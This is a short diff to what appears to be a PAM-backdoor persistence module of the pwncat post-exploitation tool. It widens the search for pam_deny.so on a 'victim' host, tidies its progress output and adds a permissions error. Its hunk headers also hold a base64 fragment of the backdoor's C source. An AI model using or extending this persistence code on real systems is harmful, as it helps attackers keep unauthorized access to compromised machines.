@@ -120,7 +120,7 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
             pam_modules = "/usr/lib/security"
             try:
                 results = (
-                    pwncat.victim.env(["find", "/usr", "-name", "pam_deny.so"])
+                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
                     .strip()
                     .decode("utf-8")
                 )
@@ -185,6 +185,9 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
                         continue
 
                 pwncat.victim.tamper.created_file("/var/log/firstlog")
+
+                util.erase_progress()
+
         except FileNotFoundError as exc:
             # A needed binary wasn't found. Clean up whatever we created.
             raise PersistenceError(str(exc))
@@ -205,7 +208,7 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
             pam_modules = "/usr/lib/security"
             try:
                 results = (
-                    pwncat.victim.env(["find", "/usr", "-name", "pam_deny.so"])
+                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
                     .strip()
                     .decode("utf-8")
                 )
@@ -244,6 +247,8 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
                             filp.write(content)
                     except (PermissionError, FileNotFoundError):
                         continue
+            else:
+                raise PersistenceError("insufficient permissions")
         except FileNotFoundError as exc:
             # Uh-oh, some binary was missing... I'm not sure what to do here...
             util.error(str(exc))
